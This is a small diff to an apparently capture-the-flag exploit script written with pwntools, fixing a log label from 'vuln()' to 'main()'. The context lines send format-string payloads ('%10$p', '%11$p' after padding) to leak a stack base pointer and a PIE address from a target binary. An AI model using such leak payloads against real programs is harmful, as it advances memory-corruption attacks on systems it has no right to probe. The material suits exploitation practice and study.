@@ -23,7 +23,7 @@ def print_msg():
 sa(b"Name: ", b"a" * 0x19 + b"%10$p")
 prep_msg()
 ebp = int(r.recvn(10)[2:], 16)  # ebp of main()
-log.info(f"ebp of vuln(): {hex(ebp)}")
+log.info(f"ebp of main(): {hex(ebp)}")
 
 # leak pie
 edit_name(b"a" * 0x19 + b"%11$p")
